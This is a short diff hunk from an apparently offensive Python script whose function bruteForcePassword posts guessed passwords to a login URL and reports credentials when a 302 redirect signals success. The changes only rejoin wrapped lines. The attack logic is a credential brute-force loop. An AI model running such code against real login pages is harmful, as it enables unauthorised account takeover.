@@ -33,15 +33,12 @@ def bruteForcePassword():
 				'password': passw
 			}
 
-			r = requests.post(login_url, data=post_data, 
-allow_redirects=False)
+			r = requests.post(login_url, data=post_data, allow_redirects=False)
 
 			# when password found
-			if r.status_code == 302:# update with success 
-status code or change in request parameter
+			if r.status_code == 302:# update with success status code or change in request parameter
 				pbar.close()
-				print('\n[!] Password found! 
-\nCredentials: %s:%s' % (post_data['email'],post_data['password']))
+				print('\n[!] Password found! \nCredentials: %s:%s' % (post_data['email'],post_data['password']))
 				sys.exit(0)
 
 		print('\nNo passwords found.')
